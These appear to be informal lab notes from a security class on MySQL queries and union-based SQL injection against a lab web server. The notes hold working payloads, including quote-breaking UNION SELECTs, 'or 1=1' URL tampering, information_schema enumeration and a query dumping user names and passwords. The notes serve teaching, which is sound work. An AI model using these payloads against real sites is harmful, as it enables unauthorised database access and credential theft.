## DEMO  
`SHOW databases;`
performane_schema is automatically generated  
database > tables > rows and columns  
`SHOW TABLES FROM <database>;`  
`SELECT * FROM session.car;  ` 
select everything in the car table in session database  
`SELECT name, cost, Year FROM session.car;  `
`SELECT * FROM session.car UNION SELECT tireid,name,size,cost,1,2 FROM session.Tires; `
have to put 1 and 2 as placeholders, shows both tables at the same time ut car table has more # of columns thats why you need the placeholders  

## cont
informations_schema is default database holds information go to money maker to find out tables and such
`SHOW dataases;`
`SHOW * FROM information_schema;`
important ones are Tables, Columns, Databases = table_schema
`SELECT Table_schema, table_name, Column_name FROM information_schema.Columns;`

if this works it shows that it is vulnerable to sql injection

POST to GET
when submitting things like this it is a POST so we can maybe change it to a GET request
f12 - network - select POST - copy raw data you put in
<url> ?<ctrl+v>
http://10.50.38.117/Union.html
Audi' UNION select 1,2,3 # - 
add more numbers to see what prints stuff out
see num 2 isnt showing in the table, understand that whatever is in that place we will not see
Audi' UNION select Table_schema,2,table_name,column_name,5 FROM Information_schema.columns#
Audi' UNION SELECT id,2,name,pass,5 FROM session.user#


GET to POST
http://10.50.38.117/uniondemo.php?Selection=1&Submit=Submit
http://10.50.38.117/uniondemo.php?Selection=1 or 1=1;
http://10.50.38.117/uniondemo.php?Selection=2 or 1=1;
fuzz page change selection to 2 
http://10.50.38.117/uniondemo.php?Selection=2 UNION select 1,2,3 #
see that 2 and 3 got swapped
10.50.38.117/uniondemo.php?Selection=2 UNION select Table_schema, column_name, table_name FROM information_schema.columns#
http://10.50.38.117/uniondemo.php?Selection=2 UNION SELECT type,color,name FROM 20session.car#
